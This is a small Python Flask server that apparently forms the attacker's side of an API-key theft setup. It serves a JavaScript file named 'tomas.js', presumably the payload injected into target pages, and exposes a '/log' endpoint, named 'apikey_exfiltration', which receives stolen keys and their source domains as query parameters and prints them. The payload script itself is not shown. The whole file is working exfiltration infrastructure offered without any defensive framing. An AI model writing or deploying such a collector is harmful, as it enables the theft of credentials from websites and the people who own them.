from flask import Flask, send_from_directory, request
import os

app = Flask(__name__)

@app.route("/tomas.js")
def serve_script():
    return send_from_directory(os.path.join(app.root_path, 'static'), 'tomas.js')

@app.route("/log")
def apikey_exfiltration():
    key = request.args.get('key', 'NO_KEY')
    domain = request.args.get('domain', 'NO_DOMAIN')

    print("[RECEIVED KEY] Domain: ", domain, " | Key: ", key)
    return "OK"

